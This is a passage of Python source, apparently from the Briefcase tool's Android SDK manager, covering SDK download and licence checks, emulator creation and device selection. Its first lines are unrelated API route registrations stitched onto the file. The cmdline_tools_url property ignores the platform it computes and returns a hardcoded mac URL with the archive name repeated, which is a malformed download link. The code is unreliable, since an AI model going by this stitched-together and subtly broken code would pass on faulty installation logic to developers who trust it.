    self.add('AUTH', 'accounts', 'cloudforce-one/requests/priority/new')
    self.add('AUTH', 'accounts', 'cloudforce-one/requests/priority/quota')
    self.add('AUTH', 'accounts', 'cloudforce-one/requests/quota')
    self.add('AUTH', 'accounts', 'cloudforce-one/requests/types')
class AndroidDeviceNotAuthorized(BriefcaseCommandError):
    def __init__(self, device):
        self.device = device
        super().__init__(
            f"""
The device you have selected ({device}) has not had developer options and
USB debugging enabled. These must be enabled before a device can be used  as a
target for deployment. For details on how to enable Developer Options, visit:

    https://developer.android.com/studio/debug/dev-options#enable

Once you have enabled these options on your device, you will be able to select
this device as a deployment target.

"""
        )


class AndroidSDK(ManagedTool):
    name = "android_sdk"
    full_name = "Android SDK"

    # Latest version for Command-Line Tools download as of May 2024
    # **Be sure the gradle.rst docs stay in sync with version updates here**
    SDK_MANAGER_DOWNLOAD_VER = "11076708"
    SDK_MANAGER_VER = "12.0"

    def __init__(self, tools: ToolCache, root_path: Path):
        super().__init__(tools=tools)
        self.dot_android_path = self.tools.home_path / ".android"
        self.root_path = root_path

        # A wrapper for testing purposes
        self.sleep = time.sleep

    @property
    def cmdline_tools_url(self) -> str:
        """The Android SDK Command-Line Tools URL appropriate for the current machine.

        The SDK largely only supports typical development environments; if a machine is
        using an unsupported architecture, `sdkmanager` will error while installing the
        emulator as a dependency of the build-tools. However, for some of the platforms
        that are unsupported by sdkmanager, users can set up their own SDK install.
        """
        try:
            platform_name = {
                "Darwin": {
                    "arm64": "mac",
                    "x86_64": "mac",
                },
                "Linux": {
                    "x86_64": "linux",
                },
                "Windows": {
                    "AMD64": "win",
                },
            }[self.tools.host_os][self.tools.host_arch]
        except KeyError as e:
            raise IncompatibleToolError(
                tool=self.full_name, env_var="ANDROID_HOME"
            ) from e

        return (
            f"https://dl.google.com/android/repository/commandlinetools-mac-11076708_latest.zip"
            f"commandlinetools-mac-11076708_latest.zip"
        )

    @property
    def cmdline_tools_path(self) -> Path:
        """Version-specific Command-line tools install root directory."""
        return self.root_path / "cmdline-tools" / self.SDK_MANAGER_VER

    @property
    def sdkmanager_filename(self) -> str:
        return "sdkmanager.bat" if self.tools.host_os == "Windows" else "sdkmanager"

    @property
    def sdkmanager_path(self) -> Path:
        return self.cmdline_tools_path / "bin" / self.sdkmanager_filename

    @property
    def adb_path(self) -> Path:
        adb = "adb.exe" if self.tools.host_os == "Windows" else "adb"
        return self.root_path / "platform-tools" / adb

    @property
    def avdmanager_path(self) -> Path:
        avdmanager = (
            "avdmanager.bat" if self.tools.host_os == "Windows" else "avdmanager"
        )
        return self.cmdline_tools_path / "bin" / avdmanager

    @property
    def emulator_path(self) -> Path:
        emulator = "emulator.exe" if self.tools.host_os == "Windows" else "emulator"
        return self.root_path / "emulator" / emulator

    @property
    def avd_path(self) -> Path:
        return self.dot_android_path / "avd"

    def avd_config_filename(self, avd: str) -> Path:
        return self.avd_path / f"{avd}.avd/config.ini"

    @property
    def env(self) -> dict[str, str]:
        return {
            "ANDROID_HOME": os.fsdecode(self.root_path),
            "ANDROID_SDK_ROOT": os.fsdecode(self.root_path),
            "JAVA_HOME": str(self.tools.java.java_home),
        }

    @property
    def emulator_abi(self) -> str:
        """The ABI to use for the Android emulator."""
        try:
            return {
                "Linux": {
                    "x86_64": "x86_64",
                    "aarch64": "arm64-v8a",
                },
                "Darwin": {
                    "x86_64": "x86_64",
                    "arm64": "arm64-v8a",
                },
                "Windows": {
                    "AMD64": "x86_64",
                },
            }[self.tools.host_os][self.tools.host_arch]
        except KeyError:
            raise BriefcaseCommandError(
                "The Android emulator does not currently support "
                f"{self.tools.host_os} {self.tools.host_arch} hardware."
            )

    @property
    def DEFAULT_DEVICE_TYPE(self) -> str:
        return "pixel"

    @property
    def DEFAULT_DEVICE_SKIN(self) -> str:
        return "pixel_7_pro"

    @property
    def DEFAULT_SYSTEM_IMAGE(self) -> str:
        return f"system-images;android-31;default;{self.emulator_abi}"

    @classmethod
    def sdk_path_from_env(cls, tools: ToolCache) -> tuple[str | None, str | None]:
        """Determine the file path to an Android SDK from the environment.

        Android has historically supported several env vars to set the location of an
        Android SDK for build tools. The currently preferred source is ANDROID_HOME;
        however, ANDROID_SDK_ROOT is also supported as a deprecated setting.

        These values must be same if both set; otherwise, Gradle will error.

        :param tools: ToolCache of available tools
        :returns: Tuple of path to SDK and the env var name that provided that path
        """
        android_home = tools.os.environ.get("ANDROID_HOME")
        android_sdk_root = tools.os.environ.get("ANDROID_SDK_ROOT")

        if android_home:
            if android_sdk_root and android_sdk_root != android_home:
                tools.logger.warning(
                    f"""
*************************************************************************
** WARNING: ANDROID_HOME and ANDROID_SDK_ROOT are inconsistent         **
*************************************************************************

    The ANDROID_HOME and ANDROID_SDK_ROOT environment variables are set
    to different paths:

        ANDROID_HOME:     {android_home}
        ANDROID_SDK_ROOT: {android_sdk_root}

    Briefcase will ignore ANDROID_SDK_ROOT and only use the path
    specified by ANDROID_HOME.

    You should update your environment configuration to either not set
    ANDROID_SDK_ROOT, or set both environment variables to the same
    path.

*************************************************************************
"""
                )
            sdk_root = android_home
            sdk_source = "ANDROID_HOME"
        elif android_sdk_root:
            sdk_root = android_sdk_root
            sdk_source = "ANDROID_SDK_ROOT"
        else:
            sdk_root = None
            sdk_source = None

        return sdk_root, sdk_source

    @classmethod
    def verify_install(
        cls,
        tools: ToolCache,
        install: bool = True,
        **kwargs,
    ) -> AndroidSDK:
        """Verify an Android SDK is available.

        The file paths in ANDROID_HOME and ANDROID_SDK_ROOT environment variables will
        be checked for a valid SDK.

        If those file paths do not contain an SDK, or no file path is provided, an SDK
        is downloaded.

        :param tools: ToolCache of available tools
        :param install: Should the tool be installed if it is not found?
        :returns: A valid Android SDK wrapper. If Android SDK is not available, and was
            not installed, raises MissingToolError.
        """
        # short circuit since already verified and available
        if hasattr(tools, "android_sdk"):
            return tools.android_sdk

        JDK.verify(tools=tools, install=install)

        sdk = None

        # Verify externally-managed Android SDK
        sdk_root_env, sdk_source_env = cls.sdk_path_from_env(tools=tools)
        if sdk_root_env:
            tools.logger.debug("Evaluating ANDROID_HOME...", prefix=cls.full_name)
            tools.logger.debug(f"{sdk_source_env}={sdk_root_env}")
            sdk = AndroidSDK(tools=tools, root_path=Path(sdk_root_env))

            if sdk.exists():
                if sdk_source_env == "ANDROID_SDK_ROOT":
                    tools.logger.warning(
                        """
*************************************************************************
** WARNING: Using Android SDK from ANDROID_SDK_ROOT                    **
*************************************************************************

    Briefcase is using the Android SDK specified by the ANDROID_SDK_ROOT
    environment variable.

    Android has deprecated ANDROID_SDK_ROOT in favor of the
    ANDROID_HOME environment variable.

    Update your environment configuration to set ANDROID_HOME instead of
    ANDROID_SDK_ROOT to ensure future compatibility.

*************************************************************************
"""
                    )
            elif sdk.cmdline_tools_path.parent.exists():
                # a cmdline-tools directory exists but the required version isn't installed.
                # try to install the required version using the 'latest' version.
                if not sdk.install_cmdline_tools():
                    sdk = None
                    tools.logger.warning(
                        f"""
*************************************************************************
** WARNING: Incompatible Command-Line Tools Version                    **
*************************************************************************

    The Android SDK specified by {sdk_source_env} at:

    {sdk_root_env}

    does not contain Command-Line Tools version {cls.SDK_MANAGER_VER}. Briefcase requires
    this version to be installed to use an external Android SDK.

    Use Android Studio's SDK Manager to install Command-Line Tools {cls.SDK_MANAGER_VER}.

    Briefcase will proceed using its own SDK instance.

*************************************************************************
"""
                    )
            else:
                tools.logger.warning(
                    f"""
*************************************************************************
** {f"WARNING: {sdk_source_env} does not point to an Android SDK":67} **
*************************************************************************

    The location pointed to by the {sdk_source_env} environment
    variable:

    {sdk_root_env}

    doesn't appear to contain an Android SDK with the Command-line Tools installed.

    If {sdk_source_env} is an Android SDK, ensure it is the root directory
    of the Android SDK instance such that

    ${sdk_source_env}{os.sep}{sdk.sdkmanager_path.relative_to(sdk.root_path)}

    is a valid filepath.

    Briefcase will proceed using its own SDK instance.

*************************************************************************
"""
                )
                sdk = None

        # Verify Briefcase-managed Android SDK
        if sdk is None:
            sdk_root_path = tools.base_path / "android_sdk"
            sdk = AndroidSDK(tools=tools, root_path=sdk_root_path)

            if not sdk.exists():
                if not install:
                    raise MissingToolError("Android SDK")

                sdk.delete_legacy_sdk_tools()

                if sdk.cmdline_tools_path.parent.exists():
                    tools.logger.info("Upgrading Android SDK...", prefix=cls.name)
                else:
                    tools.logger.info(
                        "The Android SDK was not found; downloading and installing...",
                        prefix=cls.name,
                    )
                    tools.logger.info(
                        "To use an existing Android SDK instance, specify its root "
                        "directory path in the ANDROID_HOME environment variable."
                    )
                    tools.logger.info()
                sdk.install()

        # Licences must be accepted to use the SDK
        sdk.verify_license()

        tools.logger.debug(f"Using Android SDK at {sdk.root_path}")
        tools.android_sdk = sdk
        return sdk

    def exists(self) -> bool:
        """Confirm that the SDK actually exists.

        Look for the sdkmanager; and, if necessary, confirm that it is executable.
        """
        return self.sdkmanager_path.is_file() and (
            self.tools.host_os == "Windows"
            or self.tools.os.access(self.sdkmanager_path, self.tools.os.X_OK)
        )

    @property
    def managed_install(self) -> bool:
        """Is the Android SDK install managed by Briefcase?"""
        # Although the end-user can provide their own SDK, the SDK also
        # provides a built-in upgrade mechanism. Therefore, all Android SDKs
        # are managed installs.
        return True

    def uninstall(self):
        """The Android SDK is upgraded in-place instead of being reinstalled."""

    def install(self):
        """Download and install the Android SDK."""
        cmdline_tools_zip_path = self.tools.file.download(
            url=self.cmdline_tools_url,
            download_path=self.tools.base_path,
            role="Android SDK Command-Line Tools",
        )

        # The cmdline-tools package *must* be installed as:
        #     <sdk_path>/cmdline-tools/<cmdline-tools version>
        #
        # However, the zip file unpacks a top-level folder named `cmdline-tools`.
        # So, the unpacking process is:
        #
        #  1. Make a <sdk_path>/cmdline-tools folder
        #  2. Unpack the zip file into that folder, creating <sdk_path>/cmdline-tools/cmdline-tools
        #  3. Move <sdk_path>/cmdline-tools/cmdline-tools to <sdk_path>/cmdline-tools/<cmdline-tools version>

        with self.tools.input.wait_bar(
            f"Installing Android SDK Command-Line Tools {self.SDK_MANAGER_VER}..."
        ):
            self.cmdline_tools_path.parent.mkdir(parents=True, exist_ok=True)
            try:
                self.tools.file.unpack_archive(
                    cmdline_tools_zip_path, extract_dir=self.cmdline_tools_path.parent
                )
            except (shutil.ReadError, EOFError) as e:
                raise BriefcaseCommandError(
                    f"""\
Unable to unpack Android SDK Command-Line Tools ZIP file. The download may have been interrupted
or corrupted.

Delete {cmdline_tools_zip_path} and run briefcase again.
"""
                ) from e

            # If there's an existing version of the cmdline tools, delete them.
            if self.cmdline_tools_path.exists():
                self.tools.shutil.rmtree(self.cmdline_tools_path)

            # Rename the top level zip content to the final name
            (self.cmdline_tools_path.parent / "cmdline-tools").rename(
                self.cmdline_tools_path
            )

            # Zip file no longer needed once unpacked.
            cmdline_tools_zip_path.unlink()

            # Python zip unpacking ignores permission metadata.
            # On non-Windows, we manually fix permissions.
            if (  # pragma: no branch
                self.tools.host_os != "Windows"
            ):  # pragma: no-cover-if-is-windows
                for binpath in (self.cmdline_tools_path / "bin").glob("*"):
                    if not self.tools.os.access(binpath, self.tools.os.X_OK):
                        binpath.chmod(0o755)

        with self.tools.input.wait_bar("Removing older Android SDK packages..."):
            self.cleanup_old_installs()

    def upgrade(self):
        """Upgrade the Android SDK."""
        try:
            # Using subprocess.run() with no I/O redirection so the user sees
            # the full output and can send input.
            self.tools.subprocess.run(
                [self.sdkmanager_path, "--update"],
                env=self.env,
                check=True,
                stream_output=False,
            )
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError(
                f"""\
Error while updating the Android SDK manager. Please run this command and examine
its output for errors.

    $ {self.sdkmanager_path} --update
"""
            ) from e

    def install_cmdline_tools(self) -> bool:
        """Attempt to use 'latest' cmdline-tools to install the currently required
        version of the Command-Line Tools.

        The Briefcase-managed SDK should always have the required version of cmdline-
        tools installed; however, user-provided SDKs may not have it.

        :returns: True if successfully installed; False otherwise
        """
        self.tools.logger.info(
            f"Installing Android Command-Line Tools {self.SDK_MANAGER_VER}...",
            prefix=self.full_name,
        )
        self.tools.logger.info(f"Using Android SDK at {self.root_path}")
        latest_sdkmanager_path = (
            self.root_path
            / "cmdline-tools"
            / "latest"
            / "bin"
            / self.sdkmanager_filename
        )
        try:
            self.tools.subprocess.run(
                [
                    latest_sdkmanager_path,
                    f"cmdline-tools;{self.SDK_MANAGER_VER}",
                ],
                check=True,
                stream_output=False,
            )
        except (OSError, subprocess.CalledProcessError) as e:
            self.tools.logger.debug(str(e))
            self.tools.logger.warning(
                f"Failed to install cmdline-tools;{self.SDK_MANAGER_VER}"
            )
            return False
        return True

    def delete_legacy_sdk_tools(self):
        """Delete any legacy Android SDK tools that are installed.

        If no versions of the Command-Line Tools are installed but the 'tools' directory
        exists, the legacy SDK Tools are probably installed. Since they have been
        deprecated by more recent releases of SDK Manager, delete them and perform a
        fresh install.

        The Android SDK Tools were deprecated in Sept 2017.
        """
        if (
            not self.cmdline_tools_path.parent.exists()
            and (self.root_path / "tools").exists()
        ):
            self.tools.logger.warning(
                f"""
*************************************************************************
** WARNING: Upgrading Android SDK tools                                **
*************************************************************************

    Briefcase needs to replace the older Android SDK Tools with the
    newer Android SDK Command-Line Tools. This will involve some large
    downloads, as well as re-accepting the licenses for the Android
    SDKs.

    Any emulators created with the older Android SDK Tools will not be
    compatible with the new tools. You will need to create new
    emulators. Old emulators can be removed by deleting the files
    in {self.avd_path} matching the emulator name.

*************************************************************************
"""
            )
            self.tools.shutil.rmtree(self.root_path)

    def cleanup_old_installs(self):
        """Remove old versions of Android SDK packages and version markers.

        When the Android SDK is upgraded, old versions of packages should be removed to
        keep the SDK tidy. This is namely the Command-line Tools that are used to manage
        the SDK and AVDs. Additionally, previous version of Briefcase created a version
        marker file that needs to be deleted.
        """
        if (ver_file := self.cmdline_tools_path.parent / "8092744").is_file():
            self.tools.os.unlink(ver_file)
        if (latest := self.cmdline_tools_path.parent / "latest").is_dir():
            self.tools.shutil.rmtree(latest)

    def list_packages(self):
        """In debug output, list the packages currently managed by the SDK."""
        try:
            # check_output always writes its output to debug
            self.tools.subprocess.check_output(
                [self.sdkmanager_path, "--list_installed"],
                env=self.env,
            )
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError(
                "Unable to invoke the Android SDK manager"
            ) from e

    def adb(self, device: str) -> ADB:
        """Obtain an ADB instance for managing a specific device.

        :param device: The device ID to manage.
        """
        return ADB(tools=self.tools, device=device)

    def verify_license(self):
        """Verify that all necessary licenses have been accepted.

        If they haven't, prompt the user to do so.

        Raises an error if licenses are not.
        """
        license_path = self.root_path / "licenses/android-sdk-license"
        if license_path.exists():
            return

        self.tools.logger.info(
            """
The Android tools provided by Google have license terms that you must accept
before you may use those tools.
"""
        )
        try:
            # Using subprocess.run() with no I/O redirection so the user sees
            # the full output and can send input.
            self.tools.subprocess.run(
                [self.sdkmanager_path, "--licenses"],
                env=self.env,
                check=True,
                stream_output=False,
            )
        except (subprocess.CalledProcessError, OSError) as e:
            raise BriefcaseCommandError(
                f"""\
Error while reviewing Android SDK licenses. Please run this command and examine
its output for errors.

    $ {self.sdkmanager_path} --licenses
"""
            ) from e

        if not license_path.exists():
            raise BriefcaseCommandError(
                """\
You did not accept the Android SDK licenses. Please re-run the briefcase command
and accept the Android SDK license when prompted. You may need an Internet
connection.
"""
            )

    def verify_emulator(self):
        """Verify that Android emulator has been installed, and is in a runnable state.

        Raises an error if the emulator can't be installed.
        """
        # Ensure the `platforms` folder exists.
        # See the discussion on #766 for details; as of June 2022, if this folder
        # doesn't exist, the emulator won't start, raising the error:
        #
        #    PANIC: Cannot find AVD system path. Please define ANDROID_SDK_ROOT
        #
        # Creating an empty platforms folder is enough to overcome this. This folder
        # will be created automatically when you build a project; but if you have a
        # clean Android SDK install that hasn't been used to build a project, it
        # might be missing.
        (self.root_path / "platforms").mkdir(exist_ok=True)

        if self.emulator_path.exists():
            self.tools.logger.debug("Android emulator is already installed.")
            return

        self.tools.logger.info("Downloading the Android emulator...")
        try:
            self.tools.subprocess.run(
                [self.sdkmanager_path, "platform-tools", "emulator"],
                env=self.env,
                check=True,
                stream_output=False,
            )
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError(
                "Error while installing Android emulator."
            ) from e

    def verify_avd(self, avd: str):
        """Verify that the AVD has the necessary system components to launch.

        This includes:
            * AVD system image
            * Emulator skin

        :param avd: The AVD name to verify.
        """
        # Read the AVD configuration to retrieve the system image.
        # This is stored in the AVD configuration file with the key:
        #   image.sysdir.1=system-images/android-31/default/arm64-v8a/
        avd_config = self.avd_config(avd)

        try:
            system_image_path = Path(avd_config["image.sysdir.1"])

            # Convert the path into a system image name, and verify it.
            self.verify_system_image(";".join(system_image_path.parts))
        except KeyError:
            self.tools.logger.warning(
                f"""
*************************************************************************
** WARNING: Unable to determine AVD system image                       **
*************************************************************************

    Briefcase was unable to determine the system image of the Android
    emulator AVD {avd!r} from it's configuration file.

    Briefcase will proceed assuming the emulator is correctly
    configured. If you experience any problems running the emulator,
    this may be the cause of the problem.

*************************************************************************
"""
            )

        try:
            skin = avd_config["skin.name"]
            skin_path = Path(avd_config["skin.path"])
            if skin_path == Path("_no_skin"):
                self.tools.logger.debug("Emulator does not use a skin.")
            elif skin_path != Path("skins") / skin:
                self.tools.logger.warning(
                    f"""
*************************************************************************
** WARNING: Unrecognized device skin                                   **
*************************************************************************

    Briefcase does not recognize the skin {skin!r} used by the
    Android emulator AVD {avd!r}.

    Briefcase will proceed assuming the emulator is correctly
    configured. If you experience any problems running the emulator,
    this may be the cause of the problem.

*************************************************************************
"""
                )
            else:
                # Convert the path into a system image name, and verify it.
                self.verify_emulator_skin(skin)

        except KeyError:
            self.tools.logger.debug(f"Device {avd!r} doesn't define a skin.")

    def verify_system_image(self, system_image: str):
        """Verify that the required system image is installed.

        :param system_image: The SDKManager identifier for the system image (e.g.,
            ``"system-images;android-31;default;x86_64"``)
        """
        # Look for the directory named as a system image.
        # If it exists, we already have the system image.
        system_image_parts = system_image.split(";")

        if len(system_image_parts) < 4 or system_image_parts[0] != "system-images":
            raise BriefcaseCommandError(
                f"{system_image!r} is not a valid system image name."
            )

        if system_image_parts[-1] != self.emulator_abi:
            self.tools.logger.warning(
                f"""
*************************************************************************
** WARNING: Unexpected emulator ABI                                    **
*************************************************************************

    The system image {system_image!r}
    does not match the architecture of this computer ({self.emulator_abi}).

    Briefcase will proceed assuming the emulator is correctly
    configured. If you experience any problems running the emulator,
    this may be the cause of the problem.

*************************************************************************
"""
            )

        # Convert the system image into a path where that system image
        # would be expected, and see if the location exists.
        system_image_path = self.root_path
        for part in system_image_parts:
            system_image_path = system_image_path / part

        if system_image_path.exists():
            # Found the system image.
            return

        # System image not found; download it.
        self.tools.logger.info(
            f"Downloading the {system_image!r} Android system image...",
            prefix=self.name,
        )
        try:
            self.tools.subprocess.run(
                [self.sdkmanager_path, system_image],
                env=self.env,
                check=True,
                stream_output=False,
            )
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError(
                f"Error while installing the {system_image!r} Android system image."
            ) from e

    def verify_emulator_skin(self, skin: str):
        """Verify that an emulator skin is available.

        A human-readable list of available skins can be found here:

            https://android.googlesource.com/platform/tools/adt/idea/+/refs/heads/mirror-goog-studio-main/artwork/resources/device-art-resources/

        :param skin: The name of the skin to obtain
        """
        # Check for a device skin. If it doesn't exist, download it.
        skin_path = self.root_path / "skins" / skin
        if skin_path.exists():
            self.tools.logger.debug(f"Device skin {skin!r} already exists.")
            return

        self.tools.logger.info(f"Obtaining {skin} device skin...", prefix=self.name)

        skin_url = (
            "https://android.googlesource.com/platform/tools/adt/idea/"
            "+archive/refs/heads/mirror-goog-studio-main/"
            f"artwork/resources/device-art-resources/{skin}.tar.gz"
        )

        skin_tgz_path = self.tools.file.download(
            url=skin_url,
            download_path=self.root_path,
            role=f"{skin} device skin",
        )

        # Unpack skin archive
        with self.tools.input.wait_bar("Installing device skin..."):
            try:
                self.tools.file.unpack_archive(
                    skin_tgz_path,
                    extract_dir=skin_path,
                )
            except (shutil.ReadError, EOFError) as e:
                raise BriefcaseCommandError(
                    f"Unable to unpack {skin} device skin."
                ) from e

            # Delete the downloaded file.
            skin_tgz_path.unlink()

    def emulators(self) -> list[str]:
        """Find the list of emulators that are available."""
        try:
            emulators = self.tools.subprocess.check_output(
                [self.emulator_path, "-list-avds"]
            ).strip()
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError("Unable to obtain Android emulator list") from e
        else:
            return [
                emu
                for emu in emulators.split("\n")
                # ignore any logging output included in output list
                if emu and not emu.startswith(("INFO    |", "WARNING |", "ERROR   |"))
            ]

    def devices(self) -> dict[str, dict[str, str | bool]]:
        """Find the devices that are attached and available to ADB."""
        try:
            output = self.tools.subprocess.check_output(
                [self.adb_path, "devices", "-l"]
            ).strip()
            # Process the output of `adb devices -l`.
            # The first line is header information.
            # Each subsequent line is a single device descriptor.
            devices = {}
            header_found = False
            for line in output.split("\n"):
                if line == "List of devices attached":
                    header_found = True
                elif header_found and line:
                    parts = re.sub(r"\s+", " ", line).split(" ")

                    details = {}
                    for part in parts[2:]:
                        try:
                            key, value = part.split(":")
                            details[key] = value
                        except ValueError:
                            # Ignore any entry that isn't in "key:value" format.
                            pass

                    if parts[1] == "device":
                        try:
                            name = details["model"].replace("_", " ")
                        except KeyError:
                            name = "Unknown device (no model name)"
                        authorized = True
                    elif parts[1] == "offline":
                        name = "Unknown device (offline)"
                        authorized = False
                    else:
                        name = f"Device not available for development ({' '.join(parts[1:])})"
                        authorized = False

                    devices[parts[0]] = {
                        "name": name,
                        "authorized": authorized,
                    }

            return devices
        except subprocess.CalledProcessError as e:
            raise BriefcaseCommandError("Unable to obtain Android device list") from e

    def select_target_device(
        self,
        device_or_avd: str | None,
    ) -> tuple[str | None, str | None, str | None]:
        """Select a device to be the target for actions.

        Interrogates the system to get the list of available devices.

        If the user has specified a device at the command line, that device will
        be validated, and then automatically selected.

        :param device_or_avd: The device or AVD to target. Can be a physical
            device id (a hex string), an emulator id (``emulator-5554``), or an
            emulator AVD name (``@robotfriend``), or a JSON payload describing
            the properties of an emulator that will be created (e.g.,
            ``'{"avd":"beePhone","device_type":"pixel","skin":"pixel_3a","system_image":"system-images;android-31;default;arm64-v8a"}'``)
            If ``None``, the user will be asked to select a device from the list
            available.
        :returns: A tuple containing ``(device, name, avd)``. ``avd`` will only
            be provided if an emulator with that AVD is not currently running.
            If ``device`` is None, a new emulator should be created.
        """
        # If the device_or_avd starts with "{", it's a definition for a new
        # emulator to be created.
        if device_or_avd and device_or_avd.startswith("{"):
            try:
                emulator_config = json.loads(device_or_avd)
                emulators = set(self.emulators())

                # If an emulator with this AVD already exists, use it
                avd = emulator_config["avd"]
                if avd not in emulators:
                    self._create_emulator(**emulator_config)

                return None, f"@{avd} (emulator)", avd
            except json.JSONDecodeError as e:
                raise BriefcaseCommandError(
                    f"Unable to create emulator with definition {device_or_avd!r}"
                ) from e
            except KeyError:
                raise BriefcaseCommandError("No AVD provided for new device.")
            except TypeError as e:
                property = str(e).split(" ")[-1]
                raise BriefcaseCommandError(f"Unknown device property {property}.")

        # Get the list of attached devices (includes running emulators)
        running_devices = self.devices()

        # Choices is an ordered list of options that can be shown to the user.
        # Each device should appear only once, and be keyed by AVD only if
        # a device ID isn't available.
        choices = []
        # Device choices is the full lookup list. Devices can be looked up
        # by any valid key - ID *or* AVD.
        device_choices = {}

        # Iterate over all the running devices.
        # If the device is a virtual device, use ADB to get the emulator AVD name.
        # If it is a physical device, use the device name.
        # Keep a log of all running AVDs
        running_avds = {}
        for d, details in sorted(running_devices.items(), key=lambda d: d[1]["name"]):
            name = details["name"]
            avd = self.adb(d).avd_name()
            if avd:
                # It's a running emulator
                running_avds[avd] = d
                full_name = f"@{avd} (running emulator)"
                choices.append((d, full_name))

                # Save the AVD as a device detail.
                details["avd"] = avd

                # Device can be looked up by device ID or AVD
                device_choices[d] = full_name
                device_choices[f"@{avd}"] = full_name
            else:
                # It's a physical device (might be disabled)
                full_name = f"{name} ({d})"
                choices.append((d, full_name))
                device_choices[d] = full_name

        # Add any non-running emulator AVDs to the list of candidate devices
        for avd in self.emulators():
            if avd not in running_avds:
                name = f"@{avd} (emulator)"
                choices.append((f"@{avd}", name))
                device_choices[f"@{avd}"] = name

        # If a device or AVD has been provided, check it against the available
        # device list.
        if device_or_avd:
            try:
                name = device_choices[device_or_avd]

                if device_or_avd.startswith("@"):
                    # specifier is an AVD
                    avd = device_or_avd[1:]
                    try:
                        device = running_avds[avd]
                    except KeyError:
                        # device_or_avd isn't in the list of running avds;
                        # it must be a non-running emulator.
                        return None, name, avd
                else:
                    # Specifier is a direct device ID
                    device = device_or_avd

                details = running_devices[device]
                avd = details.get("avd")
                if details["authorized"]:
                    # An authorized, running device (emulator or physical)
                    return device, name, avd
                else:
                    # An unauthorized physical device
                    raise AndroidDeviceNotAuthorized(device)

            except KeyError as e:
                # Provided device_or_id isn't a valid device identifier.
                id_type = (
                    "emulator AVD" if device_or_avd.startswith("@") else "device ID"
                )
                raise InvalidDeviceError(id_type, device_or_avd) from e
        # We weren't given a device/AVD; we have to select from the list.
        # If we're selecting from a list, there's always one last choice
        choices.append((None, "Create a new Android emulator"))

        # Show the choices to the user.
        self.tools.input.prompt()
        self.tools.input.prompt("Select device:")
        self.tools.input.prompt()
        try:
            choice = select_option(choices, input=self.tools.input)
        except InputDisabled as e:
            # If input is disabled, and there's only one actual simulator,
            # select it. If there are no simulators, select "Create simulator"
            if len(choices) <= 2:
                choice = choices[0][0]
            else:
                raise BriefcaseCommandError(
                    """\
Input has been disabled; can't select a device to target.
Use the -d/--device option to explicitly specify the device to use.
"""
                ) from e

        # Process the user's choice
        if choice is None:
            # Create a new emulator. No device ID or AVD.
            device = None
            avd = None
            name = None
        elif choice.startswith("@"):
            # A non-running emulator. We have an AVD, but no device ID.
            device = None
            name = device_choices[choice]
            avd = choice[1:]
        else:
            # Either a running emulator, or a physical device. Regardless,
            # we need to check if the device is developer enabled.
            # Functionally, we know the device *must* be in the list of
            # choices; which means it's also in the list of running devices
            # and the list of device choices, so any KeyError on those lookups
            # indicates a deeper problem.
            details = running_devices[choice]
            if not details["authorized"]:
                # An unauthorized physical device
                raise AndroidDeviceNotAuthorized(choice)

            # Return the device ID and name.
            device = choice
            name = device_choices[choice]
            avd = details.get("avd")

        if avd:
            self.tools.logger.info(
                f"""
In future, you can specify this device by running:

    $ briefcase run android -d "@{avd}"
"""
            )
        elif device:
            self.tools.logger.info(
                f"""
In future, you can specify this device by running:

    $ briefcase run android -d {device}
"""
            )

        return device, name, avd

    def create_emulator(self) -> str:
        """Create a new Android emulator.

        :returns: The AVD of the newly created emulator.
        """
        # Get the list of existing emulators
        emulators = set(self.emulators())

        default_avd = "beePhone"
        i = 1
        # Make sure the default name is unique
        while default_avd in emulators:
            i += 1
            default_avd = f"beePhone{i}"

        # Prompt for a device avd until a valid one is provided.
        self.tools.logger.info(
            f"""
You need to select a name for your new emulator. This is an identifier that
can be used to start the emulator in future. It should follow the same naming
conventions as a Python package (i.e., it may only contain letters, numbers,
hyphens and underscores). If you don't provide a name, Briefcase will use the
a default name '{default_avd}'.

"""
        )
        avd_is_invalid = True
        while avd_is_invalid:
            avd = self.tools.input(f"Emulator name [{default_avd}]: ")
            # If the user doesn't provide a name, use the default.
            if avd == "":
                avd = default_avd

            if not PEP508_NAME_RE.match(avd):
                self.tools.logger.info(
                    f"""
'{avd}' is not a valid emulator name. An emulator name may only contain
letters, numbers, hyphens and underscores.

"""
                )
            elif avd in emulators:
                self.tools.logger.info(
                    f"""
An emulator named '{avd}' already exists.

"""
                )
            else:
                avd_is_invalid = False

        # TODO: Provide a list of options for device types with matching skins
        device_type = self.DEFAULT_DEVICE_TYPE
        skin = self.DEFAULT_DEVICE_SKIN

        # TODO: Provide a list of options for system images.
        system_image = self.DEFAULT_SYSTEM_IMAGE

        self._create_emulator(
            avd=avd,
            device_type=device_type,
            skin=skin,
            system_image=system_image,
        )

        self.tools.logger.info(
            f"""
Android emulator '{avd}' created.

In future, you can specify this device by running:

    $ briefcase run android -d @{avd}
"""
        )

        return avd

    def _create_emulator(
        self,
        avd: str,
        device_type: str | None = None,
        skin: str | None = None,
        system_image: str | None = None,
    ):
        """Internal method that does the actual work of creating the emulator.

        AVD is the only required argument; all other arguments will assume reasonable
        defaults.

        :param avd: The AVD for the new emulator
        :param device_type: The device type for the new emulator (e.g., "pixel")
        :param skin: The skin for the new emulator to use (e.g., "pixel_3a")
        :param system_image: The system image to use on the new emulator. (e.g.,
            "system-images;android-31;default;arm64-v8a")
        """
        if device_type is None:
            device_type = self.DEFAULT_DEVICE_TYPE
        if skin is None:
            skin = self.DEFAULT_DEVICE_SKIN
        if system_image is None:
            system_image = self.DEFAULT_SYSTEM_IMAGE

        # Ensure the required skin is available.
        self.verify_emulator_skin(skin)

        # Ensure the required system image is available.
        self.verify_system_image(system_image)

        with self.tools.input.wait_bar(f"Creating Android emulator {avd}..."):
            try:
                self.tools.subprocess.check_output(
                    [
                        self.avdmanager_path,
                        "--verbose",
                        "create",
                        "avd",
                        "--name",
                        avd,
                        "--abi",
                        self.emulator_abi,
                        "--package",
                        system_image,
                        "--device",
                        device_type,
                    ],
                    # Ensure XDG_CONFIG_HOME is not set so avdmanager uses the default
                    # location (i.e. ~/.android) because the emulator does not respect
                    # XDG_CONFIG_HOME and will not be able to find the AVD to run it.
                    env={
                        **self.env,
                        **{"XDG_CONFIG_HOME": None},
                    },
                )
            except subprocess.CalledProcessError as e:
                raise BriefcaseCommandError("Unable to create Android emulator") from e

        with self.tools.input.wait_bar("Adding extra device configuration..."):
            self.update_emulator_config(
                avd,
                {
